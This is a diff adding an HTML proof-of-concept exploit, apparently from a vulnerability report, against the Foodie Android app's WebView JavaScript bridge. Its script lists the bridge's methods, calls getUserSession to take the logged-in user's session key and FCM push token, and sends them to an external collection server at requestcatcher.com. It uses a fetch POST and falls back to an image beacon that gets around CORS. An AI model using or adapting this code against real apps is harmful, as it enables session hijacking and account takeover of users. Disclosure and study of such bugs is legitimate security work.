@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Foodie Session Steal PoC</title>
+<style>
+  body { background:#1a1a1a; color:#0f0; font-family:monospace; padding:12px; margin:0; }
+  h2  { color:#f55; margin:4px 0; }
+  pre { background:#000; padding:8px; border:1px solid #0f0; word-break:break-all;
+        white-space:pre-wrap; font-size:13px; max-height:60vh; overflow:auto; }
+  .ok  { color:#0f0; } .warn { color:#ff0; } .err { color:#f55; }
+  #token-box { background:#000; border:2px solid #f55; padding:10px; margin:8px 0;
+               word-break:break-all; font-size:14px; color:#ff0; }
+</style>
+</head>
+<body>
+<h2>&#x26A0; Foodie WebView Session Steal PoC</h2>
+<div id="token-box">[ 대기 중... getUserSession 호출 전 ]</div>
+<pre id="log"></pre>
+
+<script>
+/* ──────────────────────────────────────────────────────────────
+   설정 영역
+   C2_URL: 공격자 HTTPS 서버 URL. 비워두면 logcat + 화면 표시만 수행.
+   ────────────────────────────────────────────────────────────── */
+var C2_URL = 'https://snowpoc.requestcatcher.com';   // 예: 'https://xxxx.ngrok-free.app' (run_poc.sh 가 자동 주입)
+
+/* ──────────────────────────────────────────────────────────────
+   로그 헬퍼
+   ────────────────────────────────────────────────────────────── */
+var logEl  = document.getElementById('log');
+var boxEl  = document.getElementById('token-box');
+
+function log(cls, msg) {
+  var line = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
+  var span = document.createElement('span');
+  span.className = cls;
+  span.textContent = line + '\n';
+  logEl.appendChild(span);
+  // logcat 캡처용 — adb logcat | grep POC_FOODIE 로 필터링
+  if (cls === 'err' || cls === 'warn') {
+    console.error('POC_FOODIE ' + msg);
+  } else {
+    console.log('POC_FOODIE ' + msg);
+  }
+}
+
+/* ──────────────────────────────────────────────────────────────
+   세션 토큰 수신 콜백
+   Bridge 호출 형태: javascript:_tokenCb('JSON_STRING')
+   JSON 구조(d3 메서드 분석):
+     { "sessionKey": "<auth_token>",
+       "pushToken": "<fcm_token>",
+       "pushEnabled": true/false,
+       "marketingPushGranted": true/false }
+   또는 JsBridgeResponse 래퍼:
+     { "success": true, "result": { "sessionKey": "..." } }
+   ────────────────────────────────────────────────────────────── */
+window._tokenCb = function(raw) {
+  log('ok', '[CALLBACK] 수신 데이터: ' + raw);
+
+  var sessionKey = '';
+  var pushToken  = '';
+
+  try {
+    var data = JSON.parse(raw);
+    // 직접 포맷
+    if (data.sessionKey) {
+      sessionKey = data.sessionKey;
+      pushToken  = data.pushToken || '';
+    }
+    // JsBridgeResponse 래퍼 포맷
+    if (data.result && data.result.sessionKey) {
+      sessionKey = data.result.sessionKey;
+      pushToken  = data.result.pushToken || '';
+    }
+  } catch (e) {
+    // 문자열 그대로인 경우 (단순 토큰)
+    sessionKey = raw;
+  }
+
+  if (!sessionKey || sessionKey === 'null') {
+    log('warn', '[!] sessionKey 없음 — 로그인 상태 확인 필요 (raw=' + raw + ')');
+    boxEl.textContent = '[!] 토큰 없음 (로그인 상태 필요)';
+    return;
+  }
+
+  /* ── 1. 화면 표시 (스크린샷 증거) ── */
+  boxEl.innerHTML =
+    '<b class="err">SESSION KEY 탈취 성공!</b><br>' +
+    '<span class="warn">sessionKey: </span>' + sessionKey + '<br>' +
+    '<span class="warn">pushToken:  </span>' + pushToken;
+
+  log('err', '★ SESSION KEY: ' + sessionKey);
+  log('err', '★ PUSH TOKEN:  ' + pushToken);
+
+  /* ── 2. logcat 전송 (adb logcat | grep POC_FOODIE_TOKEN) ── */
+  console.error('POC_FOODIE_TOKEN sessionKey=' + sessionKey);
+  console.error('POC_FOODIE_TOKEN pushToken='  + pushToken);
+
+  /* ── 3. HTTPS C2 서버로 전송 (C2_URL 설정 시) ── */
+  if (C2_URL) {
+    exfiltrate(sessionKey, pushToken);
+  }
+};
+
+function exfiltrate(sessionKey, pushToken) {
+  var payload = JSON.stringify({
+    app:        'com.linecorp.foodcam.android',
+    vuln:       'VALID-001 FoodieBridgeInterface.getUserSession()',
+    sessionKey: sessionKey,
+    pushToken:  pushToken,
+    userAgent:  navigator.userAgent,
+    ts:         Date.now()
+  });
+
+  log('ok', '[*] C2로 전송 중: ' + C2_URL + '/steal');
+
+  // 방법 1: fetch POST (CORS 허용 서버 필요)
+  fetch(C2_URL + '/steal', {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body:    payload
+  })
+  .then(function(r) {
+    log('ok', '[+] fetch POST 성공 (status=' + r.status + ')');
+  })
+  .catch(function(e) {
+    log('warn', '[!] fetch 실패: ' + e + ' — Image beacon 시도');
+    // 방법 2: Image beacon (GET 방식, CORS 우회)
+    var img = new Image();
+    img.src = C2_URL + '/steal?d=' + encodeURIComponent(payload);
+    img.onload  = function() { log('ok',   '[+] Image beacon 성공'); };
+    img.onerror = function() { log('warn', '[!] Image beacon도 실패'); };
+  });
+}
+
+/* ──────────────────────────────────────────────────────────────
+   Bridge 탐지 및 getUserSession 호출
+   ────────────────────────────────────────────────────────────── */
+log('ok', '[*] 로드 완료: ' + location.href);
+log('ok', '[*] userAgent: ' + navigator.userAgent);
+
+var bridgeType = typeof window.FoodieBridgeInterface;
+log('ok', '[*] FoodieBridgeInterface = ' + bridgeType);
+
+if (bridgeType === 'undefined') {
+  log('err', '[!] Bridge 없음 — WebViewActivity 외부 로드 확인 필요');
+  boxEl.textContent = '[!] FoodieBridgeInterface 없음';
+} else {
+  // 메서드 목록 열거
+  try {
+    var methods = [];
+    for (var k in window.FoodieBridgeInterface) { methods.push(k); }
+    log('ok', '[*] 노출 메서드 ' + methods.length + '개: ' + methods.join(', '));
+  } catch (e) { log('warn', '[!] 메서드 열거 오류: ' + e); }
+
+  // appInfo 호출 (로그인 불필요, 앱 정보 확인용)
+  try {
+    window._appInfoCb = function(raw) {
+      log('ok', '[*] appInfo 응답: ' + raw);
+    };
+    window.FoodieBridgeInterface.appInfo('_appInfoCb');
+  } catch (e) { log('warn', '[!] appInfo 오류: ' + e); }
+
+  // getUserSession 호출 (핵심 — 세션 탈취)
+  try {
+    log('warn', '[*] getUserSession 호출 중...');
+    window.FoodieBridgeInterface.getUserSession('_tokenCb');
+  } catch (e) {
+    log('err', '[!] getUserSession 오류: ' + e);
+  }
+}
+</script>
+</body>
+</html>
